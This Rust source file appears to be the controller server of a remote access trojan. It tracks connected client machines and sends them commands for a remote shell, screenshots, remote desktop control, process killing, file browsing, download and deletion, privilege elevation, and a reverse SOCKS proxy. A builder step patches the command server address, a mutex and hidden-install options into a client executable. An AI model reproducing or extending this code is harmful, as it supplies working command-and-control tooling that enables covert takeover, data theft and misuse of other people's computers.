use std::collections::HashMap;
use tokio::sync::mpsc::{Receiver, Sender};
use std::net::SocketAddr;

use std::sync::{ Arc, Mutex };
use tauri::{ AppHandle, Manager };

use common::packets::ClientInfo;

use rand::rngs::OsRng;
use rand::Rng;
use rsa::{pkcs8::ToPublicKey, PaddingScheme, RsaPrivateKey, RsaPublicKey};
use base64::{engine::general_purpose, Engine as _};

use tokio::{io::{self, AsyncWriteExt, AsyncReadExt}, task, net::{TcpListener, TcpStream}};
use common::socks::MAGIC_FLAG;
use net2::TcpStreamExt;

use common::packets::*;

use anyhow::{Context, Result};

use crate::commands::*;

use common::{ENC_TOK_LEN, RSA_BITS};

use serde::Serialize;

use object::{ Object, ObjectSection };
use std::fs::{ self, File as FsFile };
use std::io::Write;
use rmp_serde::Serializer;

#[derive(Debug, Clone, Serialize)]
struct FrontClientNotification {
    pub username: String,
    pub addr: String,
}

#[derive(Debug, Clone, Serialize)]
pub struct Log {
    pub event_type: String,
    pub message: String,
}

#[derive(Debug, Clone)]
struct Logger {
    logs: Vec<Log>,
    tauri_handle: Option<Arc<Mutex<AppHandle>>>,
}

impl Logger {
    pub fn new() -> Self {
        Self { logs: Vec::new(), tauri_handle: None }
    }
    
    pub async fn log(&mut self, event_type: &str, message: &str) {
        let log = Log { event_type: event_type.to_string(), message: message.to_string() };
        self.logs.push(log.clone());

        if let Some(handle) = &self.tauri_handle {
            handle.lock().unwrap().emit_all("server_log", log).unwrap_or_else(|e| println!("Failed to emit log event: {}", e));
        }
    }

    pub async fn log_once(&mut self, log: Log) {
        self.logs.push(log.clone());

        if let Some(handle) = &self.tauri_handle {
            handle.lock().unwrap().emit_all("server_log", log).unwrap_or_else(|e| println!("Failed to emit log event: {}", e));
        }
    }
}

pub struct ServerWrapper {
    receiver: Receiver<ServerCommand>,
    txs: HashMap<std::net::SocketAddr, Sender<ClientCommand>>,
    connected_users: HashMap<std::net::SocketAddr, ClientInfo>,
    priv_key: RsaPrivateKey,
    pub_key: RsaPublicKey,
    tauri_handle: Option<Arc<Mutex<AppHandle>>>,
    reverse_proxy_tasks: HashMap<std::net::SocketAddr, tokio::task::JoinHandle<()>>,
    log_events: Logger,
}

impl ServerWrapper {
    pub async fn spawn(receiver: Receiver<ServerCommand>) -> Result<()> {
        let txs: HashMap<std::net::SocketAddr, Sender<ClientCommand>> = HashMap::new();
        let connected_users: HashMap<std::net::SocketAddr, ClientInfo> = HashMap::new();
        let mut rng = OsRng;
        let priv_key =
            RsaPrivateKey::new(&mut rng, RSA_BITS).with_context(|| "Failed to generate a key.")?;
        let pub_key = RsaPublicKey::from(&priv_key);

        let s = Self {
            receiver,
            txs,
            connected_users,
            priv_key,
            pub_key,
            tauri_handle: None,
            reverse_proxy_tasks: HashMap::new(),
            log_events: Logger::new(),
        };

        s.channel_loop().await;

        Ok(())
    }
    
    async fn emit_client_status(&self, username: &str, addr: &SocketAddr, status: &str) {
        if let Some(handle) = &self.tauri_handle {
            handle.lock().unwrap().emit_all(status, FrontClientNotification { username: username.clone().to_string(), addr: addr.to_string() }).unwrap_or_else(|e| println!("Failed to emit client_status event: {}", e));
        }
    }

    async fn channel_loop(mut self) {
        loop {
            use crate::commands::ServerCommand::*;

            let p = match self.receiver.recv().await {
                Some(p) => p,
                None => break,
            };

            match p {
                Log(log) => {
                    self.log_events.log_once(log).await;
                }
                CloseClientSessions() => {
                    println!("Closing client sessions");
                    for (addr, tx) in self.txs.iter_mut() {
                        tx.send(ClientCommand::Close).await.unwrap();
                        self.reverse_proxy_tasks.remove(&addr);
                    }
                    self.txs.clear();
                    self.connected_users.clear();
                    self.reverse_proxy_tasks.clear();
                    self.log_events.log("server_stopped", "Server stopped!").await;
                }
                EncryptionRequest(tx, otx) => {
                    let mut token = [0u8; ENC_TOK_LEN];
                    OsRng.fill(&mut token);
                    tx.send(ClientCommand::Write(
                        ClientboundPacket::EncryptionResponse(
                            self.pub_key.to_public_key_der().unwrap().as_ref().to_vec(),
                            token.to_vec(),
                        ),
                    ))
                    .await
                    .unwrap();
                    otx.send(token.to_vec()).unwrap();
                }
                EncryptionConfirm(tx, otx, enc_s, enc_t, exp_t) => {
                    let t = {
                        let padding = PaddingScheme::new_pkcs1v15_encrypt();
                        self.priv_key
                            .decrypt(padding, &enc_t)
                            .expect("Failed to decrypt.")
                    };
                    if t != exp_t {
                        eprintln!("Encryption handshake failed!");
                        tx.send(ClientCommand::Close).await.ok();
                        otx.send(Err(())).unwrap();
                    } else {
                        let s = {
                            let padding = PaddingScheme::new_pkcs1v15_encrypt();
                            self.priv_key
                                .decrypt(padding, &enc_s)
                                .expect("Failed to decrypt.")
                        };
                        otx.send(Ok(s.clone())).unwrap();
                        tx.send(ClientCommand::SetSecret(Some(s.clone())))
                            .await
                            .unwrap();
                        tx.send(ClientCommand::Write(ClientboundPacket::EncryptionAck))
                            .await
                            .unwrap();

                        // After successful encryption, request client info
                        tx.send(ClientCommand::Write(ClientboundPacket::InitClient))
                            .await
                            .unwrap();
                    }
                }
                RegisterClient(tx, addr, client_info) => {                    // Store the client's connection sender
                    self.txs.insert(addr, tx);
                    self.connected_users.insert(addr, client_info.clone());
                    
                    let message = format!("Client [{}] {} connected!", addr, client_info.username);

                    self.log_events.log("client_connected", &message).await;
                    self.emit_client_status(&client_info.username, &addr, "client_connected").await;
                }
                VisitWebsite(addr, visit_data) => {
                    let client = self.connected_users.get(&addr).unwrap();
                    let message = format!("Run Visit Website on client [{}] [{}]", addr, client.username);

                    self.log_events.log("cmd_sent", &message).await;

                    if let Some(tx) = self.txs.get(&addr) {
                        tx.send(ClientCommand::Write(ClientboundPacket::VisitWebsite(visit_data)))
                            .await
                            .unwrap_or_else(|e| println!("Failed to send visit website request: {}", e));
                    }
                }
                ShowMessageBox(addr, message_box_data) => {
                    let client = self.connected_users.get(&addr).unwrap();
                    let message = format!("Run Show MessageBox on client [{}] [{}]", addr, client.username);

                    self.log_events.log("cmd_sent", &message).await;

                    if let Some(tx) = self.txs.get(&addr) {
                        tx.send(ClientCommand::Write(ClientboundPacket::ShowMessageBox(message_box_data)))
                            .await
                            .unwrap_or_else(|e| println!("Failed to send show message box request: {}", e));
                    }
                }
                ElevateClient(addr) => {
                    let client = self.connected_users.get(&addr).unwrap();
                    let message = format!("Run Elevate Client on client [{}] [{}]", addr, client.username);

                    self.log_events.log("cmd_sent", &message).await;

                    if let Some(tx) = self.txs.get(&addr) {
                        tx.send(ClientCommand::Write(ClientboundPacket::ElevateClient))
                            .await
                            .unwrap_or_else(|e| println!("Failed to send elevate client request: {}", e));
                    }
                }
                ScreenshotData(addr, screenshot_data) => { 
                    let client = self.connected_users.get(&addr).unwrap();
                    let message = format!("Received screenshot from client [{}] [{}]", addr, client.username);

                    self.log_events.log("cmd_rcvd", &message).await;

                    let base64_img = general_purpose::STANDARD.encode(&screenshot_data);
                    
                    if let Some(handle) = &self.tauri_handle {
                        handle.lock().unwrap().emit_all("client_screenshot", base64_img).unwrap_or_else(|e| println!("Failed to emit client_screenshot event: {}", e));
                    } else {
                        println!("Cannot send client_screenshot event: Tauri handle not set");
                    }
                }
                TakeScreenshot(addr, display) => {
                    let client = self.connected_users.get(&addr).unwrap();
                    let message = format!("Run Take Screenshot on client [{}] [{}]", addr, client.username);

                    self.log_events.log("cmd_sent", &message).await;

                    if let Some(tx) = self.txs.get(&addr) {
                        tx.send(ClientCommand::Write(ClientboundPacket::ScreenshotDisplay(display)))
                            .await
                            .unwrap_or_else(|e| println!("Failed to send screenshot request: {}", e));
                    }
                }
                GetProcessList(addr) => {
                    let client = self.connected_users.get(&addr).unwrap();
                    let message = format!("Run Get Process List on client [{}] [{}]", addr, client.username);

                    self.log_events.log("cmd_sent", &message).await;

                    if let Some(tx) = self.txs.get(&addr) {
                        tx.send(ClientCommand::Write(ClientboundPacket::GetProcessList))
                            .await
                            .unwrap_or_else(|e| println!("Failed to send get process list request: {}", e));
                    }
                }
                ProcessList(addr, process_list) => {
                    let client = self.connected_users.get(&addr).unwrap();
                    let message = format!("Received process list from client [{}] [{}]", addr, client.username);

                    self.log_events.log("cmd_rcvd", &message).await;

                    let payload = serde_json::json!({
                        "addr": addr.to_string(),
                        "processes": process_list.processes.clone()
                    });

                    if let Some(handle) = &self.tauri_handle {
                        handle.lock().unwrap().emit_all("process_list", payload).unwrap_or_else(|e| println!("Failed to emit process_list event: {}", e));
                    } else {
                        println!("Cannot send process_list event: Tauri handle not set");
                    }
                }
                KillProcess(addr, process) => {
                    let client = self.connected_users.get(&addr).unwrap();
                    let message = format!("Run Kill Process on client [{}] [{}]", addr, client.username);

                    self.log_events.log("cmd_sent", &message).await;

                    if let Some(tx) = self.txs.get(&addr) {
                        tx.send(ClientCommand::Write(ClientboundPacket::KillProcess(process)))
                            .await
                            .unwrap_or_else(|e| println!("Failed to send kill process request: {}", e));
                    }
                }
                StartShell(addr) => {
                    let client = self.connected_users.get(&addr).unwrap();
                    let message = format!("Run Start Shell on client [{}] [{}]", addr, client.username);

                    self.log_events.log("cmd_sent", &message).await;

                    if let Some(tx) = self.txs.get(&addr) {
                        tx.send(ClientCommand::Write(ClientboundPacket::StartShell))
                            .await
                            .unwrap_or_else(|e| println!("Failed to send start shell request: {}", e));
                    }
                }
                ExitShell(addr) => {
                    let client = self.connected_users.get(&addr).unwrap();
                    let message = format!("Run Exit Shell on client [{}] [{}]", addr, client.username);

                    self.log_events.log("cmd_sent", &message).await;

                    if let Some(tx) = self.txs.get(&addr) {
                        tx.send(ClientCommand::Write(ClientboundPacket::ExitShell))
                            .await
                            .unwrap_or_else(|e| println!("Failed to send exit shell request: {}", e));
                    }
                }
                ShellCommand(addr, command) => {
                    let client = self.connected_users.get(&addr).unwrap();
                    let message = format!("Run Shell Command on client [{}] [{}]", addr, client.username);

                    self.log_events.log("cmd_sent", &message).await;

                    if let Some(tx) = self.txs.get(&addr) {
                        tx.send(ClientCommand::Write(ClientboundPacket::ShellCommand(command)))
                            .await
                            .unwrap_or_else(|e| println!("Failed to send shell command request: {}", e));
                    }
                }
                ShellOutput(addr, output) => {
                    let client = self.connected_users.get(&addr).unwrap();
                    let message = format!("Received shell output from client [{}] [{}]", addr, client.username);

                    self.log_events.log("cmd_rcvd", &message).await;

                    let payload = serde_json::json!({
                        "addr": addr.to_string(),
                        "shell_output": output.clone()
                    });

                    if let Some(handle) = &self.tauri_handle {
                        handle.lock().unwrap().emit_all("client_shellout", payload).unwrap_or_else(|e| println!("Failed to emit shell_output event: {}", e));
                    } else {
                        println!("Cannot send client_shellout event: Tauri handle not set");
                    }
                }
                StartRemoteDesktop(addr, config) => {
                    let client = self.connected_users.get(&addr).unwrap();
                    let message = format!("Run Start Remote Desktop on client [{}] [{}]", addr, client.username);

                    self.log_events.log("cmd_sent", &message).await;

                    if let Some(tx) = self.txs.get(&addr) {
                        tx.send(ClientCommand::Write(ClientboundPacket::StartRemoteDesktop(config)))
                            .await
                            .unwrap_or_else(|e| println!("Failed to send start remote desktop request: {}", e));
                    }
                }
                StopRemoteDesktop(addr) => {
                    let client = self.connected_users.get(&addr).unwrap();
                    let message = format!("Run Stop Remote Desktop on client [{}] [{}]", addr, client.username);

                    self.log_events.log("cmd_sent", &message).await;

                    if let Some(tx) = self.txs.get(&addr) {
                        tx.send(ClientCommand::Write(ClientboundPacket::StopRemoteDesktop))
                            .await
                            .unwrap_or_else(|e| println!("Failed to send stop remote desktop request: {}", e));
                    }
                }  
                MouseClick(addr, click_data) => {
                    let client = self.connected_users.get(&addr).unwrap();
                    let message = format!("Run Mouse Click on client [{}] [{}]", addr, client.username);

                    self.log_events.log("cmd_sent", &message).await;

                    if let Some(tx) = self.txs.get(&addr) {
                        tx.send(ClientCommand::Write(ClientboundPacket::MouseClick(click_data)))
                            .await
                            .unwrap_or_else(|e| println!("Failed to send mouse click request: {}", e));
                    }
                }
                RemoteDesktopFrame(addr, frame) => {
                    let base64_img = general_purpose::STANDARD.encode(&frame.data);

                    let payload = serde_json::json!({
                        "addr": addr.to_string(),
                        "timestamp": frame.timestamp,
                        "display": frame.display,
                        "data": base64_img
                    });
                    
                    if let Some(handle) = &self.tauri_handle {
                        handle.lock().unwrap().emit_all("remote_desktop_frame", payload).unwrap_or_else(|e| println!("Failed to emit remote_desktop_frame event: {}", e));
                    } else {
                        println!("Cannot send remote_desktop_frame event: Tauri handle not set");
                    }
                }
                GetClients(resp) => {
                    let mut clients = Vec::new();
                    
                    for (addr, client_info) in self.connected_users.iter() {
                        clients.push(crate::handlers::FrontClient {
                            group: client_info.group.clone(),
                            addr: addr.clone(),
                            username: client_info.username.clone(),
                            hostname: client_info.hostname.clone(),
                            os: client_info.os.clone(),
                            ram: client_info.ram.clone(),
                            cpu: client_info.cpu.clone(),
                            gpus: client_info.gpus.clone(),
                            storage: client_info.storage.clone(),
                            displays: client_info.displays,
                            ip: addr.to_string(),
                            disconnected: !self.txs.contains_key(addr),
                            is_elevated: client_info.is_elevated,
                        });
                    }
                    
                    resp.send(clients).ok();
                }
                GetClient(addr, resp) => {
                    if let Some(client_info) = self.connected_users.get(&addr) {
                        let front_client = crate::handlers::FrontClient {
                            group: client_info.group.clone(),
                            addr: addr.clone(),
                            username: client_info.username.clone(),
                            hostname: client_info.hostname.clone(),
                            os: client_info.os.clone(),
                            ram: client_info.ram.clone(),
                            cpu: client_info.cpu.clone(),
                            gpus: client_info.gpus.clone(),
                            storage: client_info.storage.clone(),
                            displays: client_info.displays,
                            ip: addr.to_string(),
                            disconnected: !self.txs.contains_key(&addr),
                            is_elevated: client_info.is_elevated,
                        };
                        
                        resp.send(Some(front_client)).ok();
                    } else {
                        resp.send(None).ok();
                    }
                }
                SetTauriHandle(handle) => {
                    self.tauri_handle = Some(Arc::new(Mutex::new(handle)));
                    self.log_events.tauri_handle = Some(self.tauri_handle.clone().unwrap());
                }
                ClientDisconnected(addr) => {
                    self.txs.remove(&addr);

                    if let Some(client_info) = self.connected_users.get(&addr) {
                        let username = client_info.username.clone();
                        println!("Emitting client_disconnected event for {}", username);
                        self.emit_client_status(&username, &addr, "client_disconnected").await;
                        println!("emitted");
                        let message = format!("Client [{}] {} disconnected!", addr, username);
                        self.log_events.log("client_disconnected", &message).await;

                        println!("crashed?");
                    }
                    
                    self.connected_users.remove(&addr);
                    self.reverse_proxy_tasks.remove(&addr);
                },
                DisconnectClient(addr) => {
                    if let Some(tx) = self.txs.get(&addr) {
                        tx.send(ClientCommand::Write(ClientboundPacket::Disconnect))
                            .await
                            .unwrap_or_else(|e| println!("Failed to send disconnect request: {}", e));
                    }
                }
                ReconnectClient(addr) => {
                    if let Some(tx) = self.txs.get(&addr) {
                        tx.send(ClientCommand::Write(ClientboundPacket::Reconnect))
                            .await
                            .unwrap_or_else(|e| println!("Failed to send reconnect request: {}", e));
                    }
                }
                ManageSystem(addr, command) => {
                    let client = self.connected_users.get(&addr).unwrap();
                    let message = format!("Run [{}] on client [{}] [{}]", command, addr, client.username);

                    self.log_events.log("cmd_sent", &message).await;

                    if let Some(tx) = self.txs.get(&addr) {
                        tx.send(ClientCommand::Write(ClientboundPacket::ManageSystem(command)))
                            .await
                            .unwrap_or_else(|e| println!("Failed to send manage system request: {}", e));
                    }
                }

                PreviousDir(addr) => {
                    if let Some(tx) = self.txs.get(&addr) {
                        tx.send(ClientCommand::Write(ClientboundPacket::PreviousDir))
                            .await
                            .unwrap_or_else(|e| println!("Failed to send previous dir request: {}", e));
                    }
                }

                ViewDir(addr, path) => {
                    if let Some(tx) = self.txs.get(&addr) {
                        tx.send(ClientCommand::Write(ClientboundPacket::ViewDir(path)))
                            .await
                            .unwrap_or_else(|e| println!("Failed to send view dir request: {}", e));
                    }
                }

                AvailableDisks(addr) => {
                    if let Some(tx) = self.txs.get(&addr) {
                        tx.send(ClientCommand::Write(ClientboundPacket::AvailableDisks))
                            .await
                            .unwrap_or_else(|e| println!("Failed to send available disks request: {}", e));
                    }
                }

                RemoveDir(addr, path) => {
                    if let Some(tx) = self.txs.get(&addr) {
                        tx.send(ClientCommand::Write(ClientboundPacket::RemoveDir(path)))
                            .await
                            .unwrap_or_else(|e| println!("Failed to send remove dir request: {}", e));
                    }
                }

                RemoveFile(addr, path) => {
                    if let Some(tx) = self.txs.get(&addr) {
                        tx.send(ClientCommand::Write(ClientboundPacket::RemoveFile(path)))
                            .await
                            .unwrap_or_else(|e| println!("Failed to send remove file request: {}", e));
                    }
                }

                DownloadFile(addr, path) => {
                    let client = self.connected_users.get(&addr).unwrap();
                    let message = format!("Run Download File on client [{}] [{}]", addr, client.username);

                    self.log_events.log("cmd_sent", &message).await;

                    if let Some(tx) = self.txs.get(&addr) {
                        tx.send(ClientCommand::Write(ClientboundPacket::DownloadFile(path)))
                            .await
                            .unwrap_or_else(|e| println!("Failed to send download file request: {}", e));
                    }
                }

                DisksResult(addr, disks) => {
                    let mut files = Vec::new();
                    for disk in disks {
                        files
                        .push(File {
                            file_type: "dir".to_string(),
                            name: format!("{}:\\", disk),
                        });
                    } 

                    let payload = serde_json::json!({
                        "addr": addr.to_string(),
                        "files": files
                    });
                    
                    if let Some(handle) = &self.tauri_handle {
                        handle.lock().unwrap().emit_all("files_result", payload).unwrap_or_else(|e| println!("Failed to emit files result event: {}", e));
                    } else {
                        println!("Cannot send files result event: Tauri handle not set");
                    }
                }
                
                FileList(addr, files) => {
                    let payload = serde_json::json!({
                        "addr": addr.to_string(),
                        "files": files
                    });

                    println!("Sending file list: {:?}", payload);
                    
                    if let Some(handle) = &self.tauri_handle {
                        handle.lock().unwrap().emit_all("files_result", payload).unwrap_or_else(|e| println!("Failed to emit file list event: {}", e));
                    } else {
                        println!("Cannot send file list event: Tauri handle not set");
                    }
                }
                
                CurrentFolder(addr, path) => {
                    let payload = serde_json::json!({
                        "addr": addr.to_string(),
                        "path": path
                    });
                    
                    if let Some(handle) = &self.tauri_handle {
                        handle.lock().unwrap().emit_all("current_folder", payload).unwrap_or_else(|e| println!("Failed to emit current folder event: {}", e));
                    } else {
                        println!("Cannot send current folder event: Tauri handle not set");
                    }
                }
                
                DownloadFileResult(addr, file_data) => {
                    let client = self.connected_users.get(&addr).unwrap();
                    let message = format!("Downloaded file from client [{}] [{}]", addr, client.username);

                    self.log_events.log("cmd_rcvd", &message).await;

                    let _ = std::fs::write(file_data.name, file_data.data);
                }

                StartReverseProxy(addr, port, local_port) => {
                    let client = self.connected_users.get(&addr).unwrap();
                    let message = format!("Run Start Reverse Proxy on client [{}] [{}]", addr, client.username);

                    self.log_events.log("cmd_sent", &message).await;

                    if let Some(tx) = self.txs.get(&addr) {
                        tx.send(ClientCommand::Write(ClientboundPacket::StartReverseProxy(port.clone())))
                            .await
                            .unwrap_or_else(|e| println!("Failed to send start reverse proxy request: {}", e));
                    }

                    let master_addr = format!("{}:{}", "0.0.0.0", port);
                    let socks_addr = format!("{}:{}", "0.0.0.0", local_port);
                    
                    let slave_listener = match TcpListener::bind(&master_addr).await{
                        Err(e) => {
                            return;
                        },
                        Ok(p) => p
                    };
            
                    let (slave_stream , slave_addr) = match slave_listener.accept().await{
                        Err(e) => {
                            return;
                        },
                        Ok(p) => p
                    };
            
                    let raw_stream = slave_stream.into_std().unwrap();
                    raw_stream.set_keepalive(Some(std::time::Duration::from_secs(10))).unwrap();
                    let mut slave_stream = TcpStream::from_std(raw_stream).unwrap();            
                    
                    let listener = match TcpListener::bind(&socks_addr).await{
                        Err(e) => {
                            return;
                        },
                        Ok(p) => p
                    };
            
                    let task = tokio::spawn(async move {
                    loop {
                        let (stream , _) = listener.accept().await.unwrap();
            
                        let raw_stream = stream.into_std().unwrap();
                        raw_stream.set_keepalive(Some(std::time::Duration::from_secs(10))).unwrap();
                        let mut stream = TcpStream::from_std(raw_stream).unwrap();
            
                        if let Err(e) = slave_stream.write_all(&[MAGIC_FLAG[0]]).await{
                            break;
                        };
            
                        let (proxy_stream , slave_addr) = match slave_listener.accept().await{
                            Err(e) => {
                                return;
                            },
                            Ok(p) => p
                        };
            
                        let raw_stream = proxy_stream.into_std().unwrap();
                        raw_stream.set_keepalive(Some(std::time::Duration::from_secs(10))).unwrap();
                        let mut proxy_stream = TcpStream::from_std(raw_stream).unwrap();
            
            
                        let task = tokio::spawn(async move {
                            let mut buf1 = [0u8 ; 1024];
                            let mut buf2 = [0u8 ; 1024];
            
                            loop{
                                tokio::select! {
                                    a = proxy_stream.read(&mut buf1) => {
                    
                                        let len = match a {
                                            Err(_) => {
                                                break;
                                            }
                                            Ok(p) => p
                                        };
                                        match stream.write_all(&buf1[..len]).await {
                                            Err(_) => {
                                                break;
                                            }
                                            Ok(p) => p
                                        };
                    
                                        if len == 0 {
                                            break;
                                        }
                                    },
                                    b = stream.read(&mut buf2) =>  { 
                                        let len = match b{
                                            Err(_) => {
                                                break;
                                            }
                                            Ok(p) => p
                                        };
                                        match proxy_stream.write_all(&buf2[..len]).await {
                                            Err(_) => {
                                                break;
                                            }
                                            Ok(p) => p
                                        };
                                        if len == 0 {
                                            break;
                                        }
                                    },
                                }
                            }
                        });


                    }
                });

                println!("Inserting reverse proxy task for {}", addr);
                self.reverse_proxy_tasks.insert(addr, task);

                }

                StopReverseProxy(addr) => {
                    let client = self.connected_users.get(&addr).unwrap();
                    let message = format!("Run Stop Reverse Proxy on client [{}] [{}]", addr, client.username);

                    self.log_events.log("cmd_sent", &message).await;

                    if let Some(tx) = self.txs.get(&addr) {
                        tx.send(ClientCommand::Write(ClientboundPacket::StopReverseProxy))
                            .await
                            .unwrap_or_else(|e| println!("Failed to send stop reverse proxy request: {}", e));
                    }

                    if let Some(task) = self.reverse_proxy_tasks.get(&addr) {
                        task.abort();
                    }

                    self.reverse_proxy_tasks.remove(&addr);
                }

                BuildClient(ip, port, mutex_enabled, mutex, unattended_mode) => {
                    let bin_data = fs::read("target/debug/client.exe").unwrap();
                    let file = object::File::parse(&*bin_data).unwrap();

                    let mut output_data = bin_data.clone();

                    let config = common::ClientConfig {
                        ip: ip.to_string(),
                        port: port.to_string(),
                        mutex_enabled,
                        mutex: mutex.to_string(),
                        unattended_mode,
                        group: "Default".to_string(),
                        install: false,
                        file_name: "".to_string(),
                        install_folder: "".to_string(),
                        enable_hidden: false,
                    };

                    let mut buffer: Vec<u8> = Vec::new();

                    config.serialize(&mut Serializer::new(&mut buffer)).unwrap();

                    let mut new_data = vec![0u8; 1024];

                    for (i, byte) in buffer.iter().enumerate() {
                        new_data[i] = *byte;
                    }

                    if let Some(section) = file.section_by_name(".zzz") {
                        let offset = section.file_range().unwrap().0 as usize;
                        let size = section.size() as usize;

                        output_data[offset..offset + size].copy_from_slice(&new_data);
                    }

                    let mut file = FsFile::create("target/debug/Client_built.exe").unwrap();
                    let _ = file.write_all(&output_data);
                }


            }
        }
    }
}